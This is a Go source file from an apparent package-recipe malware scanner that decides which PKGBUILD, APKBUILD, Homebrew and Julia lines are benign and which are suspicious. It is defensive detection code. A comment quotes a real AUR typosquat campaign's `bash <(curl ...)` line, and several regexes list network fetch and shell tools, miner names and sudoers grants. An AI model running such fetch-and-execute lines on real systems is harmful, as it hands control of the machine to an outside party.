package detect

import (
	"regexp"
	"strings"
)

// Line-level judgements for PKGBUILD-family recipes (AUR PKGBUILD and .install, Alpine APKBUILD,
// Homebrew formulae and casks, Julia build.jl). Each function answers one question the audit of
// the self-minted AUR, BREW, APK and JULIA records found the command rules getting wrong. They are
// pure functions of the line (or, for the Homebrew view, of the file); suppressLine and Detect
// decide where each applies.

// pkgbuildMetadataRE is a PKGBUILD metadata assignment: the description, the dependency lists,
// the package's own name. Their values are text that makepkg reads, never runs.
var pkgbuildMetadataRE = regexp.MustCompile(
	`^(?:pkgdesc|pkgname|pkgbase|_pkgname|_pkgbase|_name|depends|makedepends|checkdepends|optdepends|provides|conflicts|replaces|groups|license|arch|keywords)(?:_[A-Za-z0-9_]+)?\+?=`)

// pkgbuildMetadataLine reports whether a line is a PKGBUILD metadata assignment whose value
// cannot run anything: no command substitution, and nothing after the value but a comment.
//
// Command rules matched the words in these values: P-MINER-BINARY on
// `optdepends=('cpuminer: the miner bitlaForge runs (pooler cpuminer, provides minerd)')` and on
// `pkgname=cgminer`, PHP-SHELL-EXEC-VAR on a pkgdesc "($_locale)", G-DOWNLOAD-SSHFS and
// P-SSH-ACCESS on descriptions of SSH tools (the audit's "metadata-string-match" records).
func pkgbuildMetadataLine(line string) bool {
	s := trimSpace(line)
	loc := pkgbuildMetadataRE.FindStringIndex(s)
	if loc == nil {
		return false
	}
	val := s[loc[1]:]
	if strings.Contains(val, "$(") || strings.Contains(val, "`") {
		return false
	}
	rest, ok := skipShellValue(val)
	if !ok {
		return false
	}
	rest = trimSpace(rest)
	return rest == "" || strings.HasPrefix(rest, "#")
}

// skipShellValue consumes one shell assignment value (a quoted string, a parenthesised array that
// may continue on later lines, or a bare word) and returns what follows it on the line.
func skipShellValue(v string) (string, bool) {
	if v == "" {
		return "", true
	}
	switch v[0] {
	case '(':
		depth, q := 0, byte(0)
		for i := 0; i < len(v); i++ {
			c := v[i]
			switch {
			case q != 0:
				if c == '\\' && q == '"' {
					i++
				} else if c == q {
					q = 0
				}
			case c == '\'' || c == '"':
				q = c
			case c == '(':
				depth++
			case c == ')':
				depth--
				if depth == 0 {
					return v[i+1:], true
				}
			}
		}
		return "", true // the array continues on the next line
	case '\'', '"':
		q := v[0]
		for i := 1; i < len(v); i++ {
			if v[i] == '\\' && q == '"' {
				i++
				continue
			}
			if v[i] == q {
				return v[i+1:], true
			}
		}
		return "", true // a multi-line string value
	}
	i := strings.IndexAny(v, " \t;&|<>")
	if i < 0 {
		return "", true
	}
	return v[i:], true
}

var (
	evalWordRE = regexp.MustCompile(`\beval\s+["'$]`)
	// evalCommandPrefixRE: what may stand before a command word. The end of a previous command,
	// an opening group, a keyword that takes a command, or an assignment prefix.
	evalCommandPrefixRE = regexp.MustCompile(`(?:^|[;&|({!` + "`" + `)]|\$\(|\b(?:then|do|else|elif|if|while|until|time|exec|command|builtin|sudo|nohup)|(?:^|\s)[A-Za-z_][A-Za-z0-9_]*=\S*)$`)
	// evalFixedTextRE: an eval whose argument is the recipe's own code, written out in the line.
	evalFixedTextRE = regexp.MustCompile(`^eval\s+(?:` +
		// eval "package_$_pkgname() {", eval "function package_${_p}() { _package; }"
		`["'](?:function\s+)?[A-Za-z_${}][A-Za-z0-9_${}-]*\s*\(\s*\)\s*\{` +
		// eval "depends+=(", eval "source_${arch}=("
		`|["'][A-Za-z_][A-Za-z0-9_${}]*\+?=\(` +
		// eval "$(declare -f package | sed ...)": re-reads the recipe's own function
		`|["']?\$\(\s*declare\s+-f\b` +
		`)`)
	// evalShellInitRE: eval "$(tool init zsh)" and kin, a local tool printing its own shell setup.
	evalShellInitRE = regexp.MustCompile(`^eval\s+["']?\$\(\s*((?:[\w./${}#-]+/)?[\w.@-]+)(?:\s+[\w.=-]+)*?\s+(?:init|shell-init|shell-hooks|hook|completion|activate|env|--init|--alias|generate-shell-completion|--sh-syntax)\b`)
	// evalShellInitDenyRE: a fetcher or decoder is never a "local tool printing its setup".
	evalShellInitDenyRE = regexp.MustCompile(`^(?:.*/)?(?:curl|wget|fetch|aria2c|nc|ncat|socat|base64|base32|xxd|openssl|python[0-9.]*|perl|ruby|node|php|sh|bash|zsh|dash|echo|printf|cat)$`)
)

// suppressNonCommandEval reports whether every `eval` on a line is either not a command or
// evaluates text the recipe itself spells out. For P-EVAL-VAR and P-INSTALL-EVAL.
//
// Not a command: `octave -q -f --eval "$*"` (a flag), `@eval $l = ...` (a Julia macro),
// `echo 'eval "$(jump shell)"'` and `==> To use, run: eval "$(fasd --init auto)"` (text).
// The recipe's own code: `eval "package_$_pkgname() {` and `eval "depends+=(` (split packages and
// soname lists built from a fixed list, 165 of the 208 withdrawn AUR P-EVAL-VAR lines),
// `eval "$(declare -f package | sed ...)"`. A local tool's shell setup:
// `eval "$(register-python-argcomplete colcon)"` is not in that list, but `eval "$(go env)"`,
// `eval "$(opam env --switch=...)"` and `eval $(dbus-launch --sh-syntax)` are.
//
// Never suppressed: an eval of a variable or of a download (`eval "$x"`, `eval "$(curl ...)"`).
func suppressNonCommandEval(line string) bool {
	s := trimSpace(line)
	locs := evalWordRE.FindAllStringIndex(s, -1)
	if len(locs) == 0 {
		return false
	}
	for _, loc := range locs {
		prefix := s[:loc[0]]
		if !evalAtCommandPosition(prefix) {
			continue
		}
		rest := s[loc[0]:]
		if evalFixedTextRE.MatchString(rest) {
			continue
		}
		if m := evalShellInitRE.FindStringSubmatch(rest); m != nil && !evalShellInitDenyRE.MatchString(m[1]) {
			continue
		}
		if chromiumAPIKeysRE.MatchString(rest) {
			continue
		}
		return false
	}
	return true
}

// evalAtCommandPosition reports whether a word preceded by prefix (on the same line) is in
// command position and outside quoted text.
func evalAtCommandPosition(prefix string) bool {
	q, qStart := byte(0), -1
	for i := 0; i < len(prefix); i++ {
		c := prefix[i]
		switch {
		case q == '\'':
			if c == '\'' {
				q = 0
			}
		case q == '"':
			if c == '\\' {
				i++
			} else if c == '"' {
				q = 0
			}
		case c == '\\':
			i++
		case c == '\'' || c == '"':
			q, qStart = c, i
		}
	}
	switch q {
	case '\'':
		return false // inside single quotes: text
	case '"':
		// Inside double quotes only `sh -c "eval ..."` runs it.
		before := strings.TrimRight(prefix[:qStart], " \t")
		inner := strings.TrimSpace(prefix[qStart+1:])
		return inner == "" && strings.HasSuffix(before, "-c")
	}
	return evalCommandPrefixRE.MatchString(strings.TrimRight(prefix, " \t"))
}

// chromiumAPIKeysRE is Alpine's chromium APKBUILD reading its own Google API keys:
// eval "$(base64 -d < $srcdir/google-api.keys)" decodes three key=value assignments that
// aports keeps base64-encoded in the tree. Every chromium subpackage was minted on it.
var chromiumAPIKeysRE = regexp.MustCompile(`eval\s+["']?\$\(\s*base64\s+(?:-d|--decode)\s*<\s*["']?(?:\$\{?srcdir\}?/)?google-api\.keys["']?\s*\)`)

// suppressChromiumAPIKeys is chromiumAPIKeysRE as a line suppressor, for the base64 and eval
// rules (P-BASE64, P-EVAL-BASE64, P-EVAL-VAR).
func suppressChromiumAPIKeys(line string) bool {
	return chromiumAPIKeysRE.MatchString(line)
}

// juliaFetchRE is curl or wget as a Julia build script uses it: a command literal run by
// run()/success()/pipeline(), or a declared BinDeps dependency named "wget"/"curl".
var juliaFetchRE = regexp.MustCompile("`\\s*(?:curl|wget)\\s|library_dependency\\(\\s*\"(?:curl|wget)\"|\"(?:curl|wget)\"\\s*=>")

// suppressJuliaBuildFetch reports whether a P-INSTALL-CURL / P-INSTALL-WGET line in a Julia
// deps/build.jl is the script fetching its own dependency. Pkg.build downloading a library is
// normal for pre-artifact packages (8 of the audited JULIA lines: ArbFloats, BaslerCamera, CLBlast,
// CQLdriver, ElasticFDA, LibASICamera, MLSuite); whether the fetch is verified is judged once per
// script by analyzeJuliaBuildDownload (JL-BUILD-DOWNLOAD context, JL-BUILD-UNVERIFIED-DOWNLOAD
// weakness). For ecosystem julia only.
// A fetch handed to a shell on the same line (pipeline(`curl -L $u`, `sh`)) is not a dependency
// download and is never suppressed.
func suppressJuliaBuildFetch(line string) bool {
	return juliaFetchRE.MatchString(line) && !juliaShellRE.MatchString(line)
}

var juliaShellRE = regexp.MustCompile("`\\s*(?:/bin/|/usr/bin/)?(?:ba|z|da|k)?sh\\b|\\|\\s*(?:ba|z|da|k)?sh\\b")

// minerWordRE is P-MINER-BINARY's word list.
var minerWordRE = regexp.MustCompile(`(?i)\b(xmrig|cpuminer|minerd|ethminer|bfgminer|cgminer|nbminer|phoenixminer|lolminer|gminer|teamredminer)\b`)

// suppressOwnMiner reports whether every miner name on the line is the package itself: building
// cgminer names cgminer on every line of its PKGBUILD. An openly named miner is a miner the user
// chose to install (8 audited AUR records); a miner hidden in another package is the malware.
// For P-MINER-BINARY and P-INSTALL-MINER; pkgName is ctx.Name.
func suppressOwnMiner(line, pkgName string) bool {
	name := strings.ToLower(pkgName)
	if name == "" {
		return false
	}
	ms := minerWordRE.FindAllString(line, -1)
	if len(ms) == 0 {
		return false
	}
	for _, m := range ms {
		if !strings.Contains(name, strings.ToLower(m)) {
			return false
		}
	}
	return true
}

var (
	// sudoersGrantRE is a sudoers rule: user (or %group, or ALL), host list, =, an optional
	// (runas), tags, then the command list.
	sudoersGrantRE = regexp.MustCompile(`(?:^|["'\s])(%?[A-Za-z_][\w.-]*|ALL)\s+[\w.,-]+\s*=\s*(\([^)]*\))?\s*((?:(?:NOPASSWD|PASSWD|SETENV|NOSETENV|NOEXEC|EXEC|LOG_INPUT|LOG_OUTPUT)\s*:\s*)*)(\S.*)?$`)
	// sudoersWriteRE writes the live sudoers configuration (not a file packaged under $pkgdir).
	sudoersWriteRE = regexp.MustCompile(`(?:>>?\s*|\btee\s+(?:-a\s+)?|\bsed\s+(?:-[A-Za-z]*i[A-Za-z]*\s+)[^;|]*\s|\b(?:cp|mv|install|ln)\s[^;|]*\s)["']?/etc/sudoers`)
)

// sudoersKind is what a line does with sudo's configuration.
type sudoersKind int

const (
	sudoersPathOnly  sudoersKind = iota // names a sudoers path without writing a rule into the live config
	sudoersNoop                         // a grant to root, which already has every right
	sudoersScoped                       // a NOPASSWD grant of named commands, no wildcard, no SETENV
	sudoersWeakGrant                    // NOPASSWD with SETENV, a wildcard argument or a /tmp path: a weakness
	sudoersFullGrant                    // passwordless ALL for a non-root user: root for anyone who is that user
	sudoersWrite                        // writes the live config; what is written is not on this line
)

// classifySudoersLine parses the sudoers rule on a line, if there is one.
func classifySudoersLine(line string) sudoersKind {
	s := trimSpace(line)
	if m := sudoersGrantRE.FindStringSubmatch(s); m != nil && (strings.Contains(s, "NOPASSWD") || strings.Contains(m[0], "ALL")) {
		user, tags, cmds := m[1], m[3], strings.Trim(trimSpace(m[4]), `"'`)
		switch {
		case user == "root":
			return sudoersNoop
		case strings.Contains(tags, "SETENV") || strings.Contains(cmds, "*") || strings.Contains(cmds, "/tmp/"):
			return sudoersWeakGrant
		case strings.HasPrefix(cmds, "ALL"):
			return sudoersFullGrant
		case strings.Contains(tags, "NOPASSWD"):
			return sudoersScoped
		}
	}
	if sudoersWriteRE.MatchString(s) && !strings.Contains(s, "pkgdir") {
		return sudoersWrite
	}
	return sudoersPathOnly
}

// suppressSudoersLine reports whether a P-SUDOERS-MOD / P-INSTALL-SUDOERS-MOD line is not a
// hostile privilege grant. Packaging a sudoers.d file (`install -Dm440 x "$pkgdir/etc/sudoers.d/x"`,
// `install -dm750 "$pkgdir/etc/sudoers.d"`), removing one on uninstall, `visudo -cf`, a test for
// its existence, an echoed hint, a grant to root and a scoped NOPASSWD service rule are packaging
// (34 + 7 withdrawn AUR lines; the 30 "sudoers-scoped-service-user" records). A weak grant
// (SETENV, a wildcard, a /tmp path) is the P-SUDOERS-WEAK-GRANT weakness instead. A full
// passwordless grant and a write into the live /etc/sudoers stay evidence.
//
// The two KEEP-V lines this drops (`install -Dm440 pkg/etc/sudoers.d/hls-livecam-dark \` and
// `rm -f /etc/sudoers.d/hls-livecam-dark`) are not what made hls-livecam-server malware: that
// record is kept because the package was removed from the AUR, and the same `rm -f` line is
// WITHDRAW in laptop-livecam.
func suppressSudoersLine(line string) bool {
	switch classifySudoersLine(line) {
	case sudoersFullGrant, sudoersWrite:
		return false
	}
	return true
}

// homebrewFormulaPathRE is a Ruby interpolation of a formula's own install location.
var homebrewFormulaPathRE = regexp.MustCompile(`^#\{(?:(?:opt_)?(?:prefix|lib|libexec|share|pkgshare|frameworks)|buildpath|testpath|HOMEBREW_PREFIX|Formula\[[^\]]+\]\.(?:opt_)?(?:prefix|lib|libexec)|[a-z_]+\.(?:opt_)?(?:prefix|lib|libexec))\}(?:/[\w.@+-]+)*/?$`)

var (
	ldPathAssignRE = regexp.MustCompile(`(?:DY)?LD_LIBRARY_PATH\s*=\s*`)
	ldPathSelfRE   = regexp.MustCompile(`\$\{(?:DY)?LD_LIBRARY_PATH:[-+]:?\$\{?(?:DY)?LD_LIBRARY_PATH\}?\}|\$\{(?:DY)?LD_LIBRARY_PATH(?::-)?\}|\$(?:DY)?LD_LIBRARY_PATH\b`)
)

// suppressFormulaOwnLibraryPath reports whether every LD_LIBRARY_PATH / DYLD_LIBRARY_PATH
// assignment on a Homebrew line points only at the formula's own prefix (#{lib}, #{libexec},
// #{Formula["libomp"].opt_lib}, HOMEBREW_PREFIX) plus the variable's previous value. A formula
// that wraps its binary to find its own libraries is not hijacking the loader (8 of the 12
// withdrawn BREW G-LD-LIBRARY-PATH lines). For G-LD-LIBRARY-PATH on homebrew only.
func suppressFormulaOwnLibraryPath(line string) bool {
	locs := ldPathAssignRE.FindAllStringIndex(line, -1)
	if len(locs) == 0 {
		return false
	}
	for _, loc := range locs {
		v := line[loc[1]:]
		v = strings.TrimLeft(v, `\"'`)
		end := len(v)
		for i := 0; i < len(v); i++ {
			if v[i] == '"' || v[i] == '\'' || v[i] == ' ' || v[i] == '\\' {
				end = i
				break
			}
			if v[i] == '#' && i+1 < len(v) && v[i+1] == '{' {
				// skip a Ruby interpolation, which may hold quotes and spaces
				if j := strings.Index(v[i:], "}"); j > 0 {
					i += j
				}
			}
		}
		v = ldPathSelfRE.ReplaceAllString(v[:end], "")
		elems := 0
		for _, e := range strings.Split(v, ":") {
			if e == "" {
				continue
			}
			elems++
			if !homebrewFormulaPathRE.MatchString(e) && !strings.HasPrefix(e, "/opt/homebrew/") && !strings.HasPrefix(e, "/home/linuxbrew/.linuxbrew/") {
				return false
			}
		}
		if elems == 0 {
			return false
		}
	}
	return true
}

var (
	rubyMessageCallRE = regexp.MustCompile(`^\s*(?:odie|opoo|ohai|onoe|oh1|puts|print|warn|raise|abort)\b[\s(]*(?:["']|<<[~-]?)`)
	rubyHeredocRE     = regexp.MustCompile(`<<[~-]?(["']?)([A-Z_][A-Z0-9_]*)(["']?)`)
	rubyBlockOpenRE   = regexp.MustCompile(`^(\s*)(?:def\s+caveats\b|caveats\s+do\b|test\s+do\b)`)
	rubyCaveatsHereRE = regexp.MustCompile(`^\s*caveats\s+<<[~-]?`)
)

// homebrewExecView blanks the parts of a Homebrew formula or cask that are never executed by an
// install: the caveats text (`def caveats` / `caveats do` blocks, `caveats <<~EOS` heredocs), the
// `test do` block (run only by `brew test`), heredocs passed to odie/opoo/ohai/puts, and one-line
// messages. Line count and every other byte are kept, so findings still report real lines.
//
// The audited BREW false positives sat there: `eval "$(tool init zsh)"` and `echo 'eval ...' >>
// ~/.zshrc` in caveats (29 P-EVAL-VAR lines), raw IPs and shorteners in `test do` assertions.
// Heredocs written to files (`(bin/"x").write <<~EOS`) are NOT blanked: that text is installed and
// may run.
func homebrewExecView(content string) string {
	lines := strings.Split(content, "\n")
	blank := func(i int) { lines[i] = strings.Repeat(" ", len(lines[i])) }
	for i := 0; i < len(lines); i++ {
		l := lines[i]
		if m := rubyBlockOpenRE.FindStringSubmatch(l); m != nil {
			indent := m[1]
			j := i + 1
			for ; j < len(lines); j++ {
				if strings.TrimRight(lines[j], " \t") == indent+"end" {
					break
				}
			}
			if j == len(lines) {
				continue // unterminated: leave it as it is
			}
			for k := i; k <= j; k++ {
				blank(k)
			}
			i = j
			continue
		}
		if rubyCaveatsHereRE.MatchString(l) || rubyMessageCallRE.MatchString(l) {
			blank(i)
			if m := rubyHeredocRE.FindStringSubmatch(l); m != nil {
				for j := i + 1; j < len(lines); j++ {
					done := strings.TrimSpace(lines[j]) == m[2]
					blank(j)
					if done {
						i = j
						break
					}
				}
			}
		}
	}
	return strings.Join(lines, "\n")
}

var (
	installFuncHeaderRE = regexp.MustCompile(`^(?:function\s+)?[A-Za-z_][A-Za-z0-9_-]*\s*\(\s*\)\s*(?:\{.*)?$|^function\s+[A-Za-z_][A-Za-z0-9_-]*\s*(?:\{.*)?$`)
	installAssignRE     = regexp.MustCompile(`^(?:export\s+|readonly\s+|declare\s+(?:-[A-Za-z]+\s+)*|local\s+)?[A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?\+?=`)
	installHeredocRE    = regexp.MustCompile(`<<-?\s*["']?([A-Za-z_][A-Za-z0-9_]*)["']?`)
	installTputRE       = regexp.MustCompile(`\$\(\s*tput\s+[\w ]+\)`)
	// installHarmlessTopRE: top-level lines seen in the 783 audited .install files that only set
	// shell options or dispatch to a hook. `op=$1; shift; $op $*` is the old pacman .install
	// trailer that calls the function named by the first argument.
	installHarmlessTopRE = regexp.MustCompile(`^(?:shift|umask\s+[0-7]+|set\s+[-+][A-Za-z]+(?:\s+[a-z]+)?|shopt\s+-[su]\s+\w+|:|true|\[\[\s+\$\w+\s+\]\]\s+&&\s+set\s+-x|"?\$\{?op\}?"?\s+(?:"?\$[*@]"?)?)$`)
)

// installTopLevelCommands returns the commands of a pacman .install script that sit outside
// every function. pacman sources the whole file as root and then calls pre_install /
// post_install / post_upgrade / pre_remove / post_remove, so a top-level command runs as root on
// install, upgrade AND removal without appearing in any hook. The live 398-package AUR typosquat
// campaign used exactly this: after empty post_install/post_upgrade functions, a top-level
// `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/...')`.
//
// Function definitions, closing braces, comments, blank lines and plain variable assignments are
// not commands (an assignment with $(...) or `...` is). Brace depth is tracked outside quotes and
// heredocs; a script whose braces never balance yields nothing rather than guesses.
func installTopLevelCommands(script string) []string {
	var out []string
	depth := 0
	parens := 0
	q := byte(0)
	heredoc := ""
	for _, raw := range strings.Split(script, "\n") {
		if heredoc != "" {
			if strings.TrimSpace(raw) == heredoc {
				heredoc = ""
			}
			continue
		}
		startDepth, startQuote, startParens := depth, q, parens
		// scan the line: quotes, comments, braces, parens
		for i := 0; i < len(raw); i++ {
			c := raw[i]
			if q != 0 {
				if c == '\\' && q == '"' {
					i++
				} else if c == q {
					q = 0
				}
				continue
			}
			switch c {
			case '\\':
				i++
				continue
			case '\'', '"':
				q = c
				continue
			case '#':
				if i == 0 || raw[i-1] == ' ' || raw[i-1] == '\t' || raw[i-1] == ';' {
					i = len(raw)
					continue
				}
			case '{':
				depth++
			case '}':
				depth--
			case '(':
				if depth == 0 {
					parens++
				}
			case ')':
				if depth == 0 && parens > 0 {
					parens--
				}
			}
		}
		if m := installHeredocRE.FindStringSubmatch(raw); m != nil && !strings.Contains(raw, "<<<") {
			heredoc = m[1]
		}
		if depth < 0 {
			return nil
		}
		if startDepth != 0 || startQuote != 0 || startParens != 0 {
			continue
		}
		s := trimSpace(raw)
		if s == "" || strings.HasPrefix(s, "#") || strings.HasPrefix(s, "}") || s == "{" {
			continue
		}
		if installFuncHeaderRE.MatchString(s) {
			continue
		}
		if installAssignRE.MatchString(s) && !strings.Contains(installTputRE.ReplaceAllString(s, ""), "$(") && !strings.Contains(s, "`") {
			continue // a plain assignment, or colours from tput
		}
		if installHarmlessTopRE.MatchString(s) {
			continue
		}
		out = append(out, s)
	}
	if depth != 0 {
		return nil
	}
	return out
}

// analyzeInstallTopLevel reports an AUR .install script's top-level commands as
// B-INSTALL-TOPLEVEL-CMD context: a command pacman runs as root on every source of the file,
// outside the hooks a reviewer reads. Context, not evidence: what the command does is judged by
// the install-script rules (the campaign's line is P-INSTALL-PROC-SUB-EXEC evidence).
func analyzeInstallTopLevel(ctx *PackageContext) []Finding {
	if !aurStyleEcosystem(ctx.Ecosystem) || ctx.InstallScriptContent == "" {
		return nil
	}
	cmds := installTopLevelCommands(ctx.InstallScriptContent)
	if len(cmds) == 0 {
		return nil
	}
	f := ctxFinding("B-INSTALL-TOPLEVEL-CMD", "install", 35,
		"Command at the top level of the .install script, outside every hook function (runs as root whenever pacman sources the file)")
	f.MatchedLine = cmds[0]
	f.Surface = SurfaceInstall
	return []Finding{f}
}

// suppressPkgbuildLine applies this file's line judgements to one rule's matched line. eco is the
// package's ecosystem and pkgName its name (ctx.Name). It is meant to be called from suppressLine
// after the comment guard; it only ever removes a line, never adds one.
//
// The shell judgements (metadata lines, eval position, sudoers parsing) apply only where the
// recipe IS shell: AUR PKGBUILD/.install and APKBUILD (and an unset ecosystem, AUR by origin),
// plus Julia for `@eval`. In an npm package.json or a Ruby formula the whole command is a quoted
// string, so "inside quotes" would hide a real `eval "$(curl …)"`, and a sudoers path in JS or
// Ruby may be the target of a write this line does not show.
func suppressPkgbuildLine(id, line, eco, pkgName string) bool {
	e := strings.ToLower(strings.TrimSpace(eco))
	base := strings.TrimPrefix(id, "IS-")
	shellRecipe := e == "" || e == "aur" || e == "alpine-apk" || e == "apk"
	if shellRecipe && pkgbuildMetadataLine(line) {
		return true
	}
	switch base {
	case "P-EVAL-VAR", "P-INSTALL-EVAL":
		return (shellRecipe || e == "julia") && suppressNonCommandEval(line)
	case "P-BASE64", "P-EVAL-BASE64", "P-INSTALL-BASE64":
		return suppressChromiumAPIKeys(line)
	case "P-MINER-BINARY", "P-INSTALL-MINER":
		return suppressOwnMiner(line, pkgName)
	case "P-SUDOERS-MOD", "P-INSTALL-SUDOERS-MOD":
		return shellRecipe && suppressSudoersLine(line)
	case "P-SUDOERS-WEAK-GRANT", "P-INSTALL-SUDOERS-WEAK-GRANT":
		return classifySudoersLine(line) == sudoersNoop
	case "G-LD-LIBRARY-PATH":
		return e == "homebrew" && suppressFormulaOwnLibraryPath(line)
	case "P-INSTALL-CURL", "P-INSTALL-WGET":
		return e == "julia" && suppressJuliaBuildFetch(line)
	}
	return false
}
